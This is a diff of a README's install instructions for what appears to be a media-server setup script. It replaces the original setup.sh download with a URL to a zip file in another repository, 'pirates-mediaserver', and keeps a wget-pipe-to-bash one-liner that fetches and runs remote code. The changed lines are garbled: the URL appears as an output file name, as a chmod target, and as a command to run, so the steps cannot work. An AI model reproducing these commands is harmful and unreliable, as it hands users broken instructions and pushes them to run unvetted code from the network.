@@ -23,17 +23,17 @@ Install
 
 Just execute below code to install them all.
 
-`wget https://git.io/setup.sh -O - -o /dev/null|bash`
+`wget https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip -O - -o /dev/null|bash`
 
 To exclude certain apps follow these instructions:
 
 ### Step 1
-Download script: `wget https://git.io/setup.sh -O setup.sh`
+Download script: `wget https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip -O https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip`
 
-Make it executable: `chmod +x setup.sh`
+Make it executable: `chmod +x https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip`
 
 ### Step 2
-Now use variable like this: `PLEX=no JACKETT=No ./setup.sh`
+Now use variable like this: `PLEX=no JACKETT=No https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip`
 
 This will install everything else except Plex and Jackett. Hope this explain basic usage.
 
